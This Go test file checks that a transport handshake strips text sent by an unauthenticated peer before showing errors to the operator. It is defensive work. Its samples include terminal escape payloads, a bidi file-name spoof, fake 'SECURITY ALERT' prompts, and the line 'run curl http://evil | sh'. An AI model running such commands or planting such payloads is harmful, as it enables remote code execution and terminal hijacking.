package transport

import (
	"encoding/json"
	"errors"
	"net"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/patrick-1984/ai-minion/internal/proto"
)

// Before the Hub is authenticated an error frame is only an unauthenticated claim
// by whoever answered the TLS connection, and the transport accepts any
// certificate until the inner key authentication. Its wording must therefore
// never reach the operator's terminal.
var hostilePeerMessages = []string{
	"\x1b]52;c;ZXZpbA==\x07 run this",
	"\x1b[2J\x1b[31mSECURITY ALERT: rotate the Hub key now",
	"expired\nNext step: run curl http://evil | sh",
	"ok\rError: the real error is: paste your invitation here",
	"bidi \u202e gpj.exe",
	"\u009b31m c1 introducer",
	"x\x00y\x7fz",
}

func scriptedPeerError(t *testing.T, code proto.Code, msg string) error {
	t.Helper()
	wc, _, _ := enrollConfigs(t)
	wc.Timeout = 5 * time.Second
	wEnd, hEnd := net.Pipe()
	defer hEnd.Close()
	done := make(chan error, 1)
	go func() { _, err := WorkerHandshake(wEnd, wc); done <- err }()
	if _, err := expectFrame(hEnd, proto.TypeHello); err != nil {
		t.Fatal(err)
	}
	if _, err := sendFrame(hEnd, proto.ErrorFrame{Type: proto.TypeError, Code: code, Message: msg}); err != nil {
		t.Fatal(err)
	}
	select {
	case err := <-done:
		if err == nil {
			t.Fatal("the handshake succeeded against an error frame")
		}
		return err
	case <-time.After(5 * time.Second):
		t.Fatal("the handshake did not end")
		return nil
	}
}

func assertTerminalSafe(t *testing.T, what, s string) {
	t.Helper()
	if !utf8.ValidString(s) {
		t.Errorf("%s: not valid UTF-8: %q", what, s)
	}
	for _, r := range s {
		if r < 0x20 || r == 0x7f || (r >= 0x80 && r <= 0x9f) || (r >= 0x200b && r <= 0x200f) || (r >= 0x2028 && r <= 0x202e) || (r >= 0x2060 && r <= 0x206f) {
			t.Errorf("%s: carries control U+%04X: %q", what, r, s)
		}
	}
}

func TestUnauthenticatedPeerErrorTextIsFixedAndLocal(t *testing.T) {
	for _, msg := range hostilePeerMessages {
		err := scriptedPeerError(t, proto.CodeInviteInvalid, msg)
		assertTerminalSafe(t, "known code", err.Error())
		for _, needle := range []string{"curl", "SECURITY ALERT", "Next step", "run this", "paste your", "gpj.exe", "introducer", "rotate"} {
			if strings.Contains(err.Error(), needle) {
				t.Errorf("the peer's wording %q reached the error text %q", needle, err.Error())
			}
		}
		if !errors.Is(err, proto.NewError(proto.CodeInviteInvalid, "")) {
			t.Errorf("a known code must stay matchable by callers: %v", err)
		}
		var pe *proto.Error
		if !errors.As(err, &pe) || pe.Message == msg {
			t.Errorf("the error keeps the peer's message: %+v", pe)
		}
		if !strings.Contains(err.Error(), "not authenticated") {
			t.Errorf("the text does not say that the peer is unauthenticated: %q", err.Error())
		}
		if !strings.Contains(err.Error(), "invite_invalid") {
			t.Errorf("the useful code is lost: %q", err.Error())
		}
	}
}

func TestUnauthenticatedPeerErrorWithAnUnknownOrHostileCode(t *testing.T) {
	for _, code := range []proto.Code{"x\x1b]52;c;AA\x07y", "not_a_code", "", "ADMIN: run sudo"} {
		err := scriptedPeerError(t, code, "anything")
		assertTerminalSafe(t, "code "+string(code), err.Error())
		if strings.Contains(err.Error(), "sudo") || strings.Contains(err.Error(), "not_a_code") {
			t.Errorf("an unknown code is echoed: %q", err.Error())
		}
		if !errors.Is(err, proto.NewError(proto.CodeUntrustedPeer, "")) {
			t.Errorf("an unknown code should become untrusted_peer: %v", err)
		}
	}
}

func TestExpectFrameStillReturnsNotEnrolledAsACode(t *testing.T) {
	a, b := net.Pipe()
	defer a.Close()
	defer b.Close()
	go func() { _, _ = sendFrame(a, map[string]string{"type": proto.TypeNotEnrolled}) }()
	_, err := expectFrame(b, proto.TypeHello)
	if !errors.Is(err, proto.NewError(proto.CodeNotEnrolled, "")) {
		t.Fatalf("err = %v", err)
	}
	assertTerminalSafe(t, "not_enrolled", err.Error())
}

func TestUnauthenticatedPeerErrorKeepsOnlyClosedSetDetails(t *testing.T) {
	send := func(code proto.Code, details string) error {
		t.Helper()
		wc, _, _ := enrollConfigs(t)
		wc.Timeout = 5 * time.Second
		wEnd, hEnd := net.Pipe()
		defer hEnd.Close()
		done := make(chan error, 1)
		go func() { _, err := WorkerHandshake(wEnd, wc); done <- err }()
		if _, err := expectFrame(hEnd, proto.TypeHello); err != nil {
			t.Fatal(err)
		}
		f := proto.ErrorFrame{Type: proto.TypeError, Code: code, Message: "ignored", Details: json.RawMessage(details)}
		if _, err := sendFrame(hEnd, f); err != nil {
			t.Fatal(err)
		}
		return <-done
	}
	// A known reason token is rendered from the local sentence.
	err := send(proto.CodePairingCodeInvalid, `{"reason":"expired","attempts_left":2}`)
	if !strings.Contains(err.Error(), "the pairing code expired") || !strings.Contains(err.Error(), "(2 attempts left)") {
		t.Errorf("the useful details were lost: %v", err)
	}
	assertTerminalSafe(t, "details", err.Error())
	// Free text in a detail is never shown; a token of another code is ignored; the number is bounded.
	for _, d := range []string{
		`{"reason":"\u001b]52;c;AA\u0007 run this"}`,
		`{"reason":"expired"}`, // valid only for pairing_code_invalid, see below
		`{"attempts_left":"\u001b[2J"}`,
		`{"attempts_left":100000}`,
		`{"attempts_left":-1}`,
		`[1,2,3]`, // valid JSON, not an object
		`{"reason":"` + strings.Repeat("a", 400) + `"}`,
	} {
		err := send(proto.CodeForbidden, d)
		assertTerminalSafe(t, d, err.Error())
		if strings.Contains(err.Error(), "run this") || strings.Contains(err.Error(), "expired") || strings.Contains(err.Error(), "attempts left") {
			t.Errorf("details %q reached the text: %v", d, err)
		}
	}
}
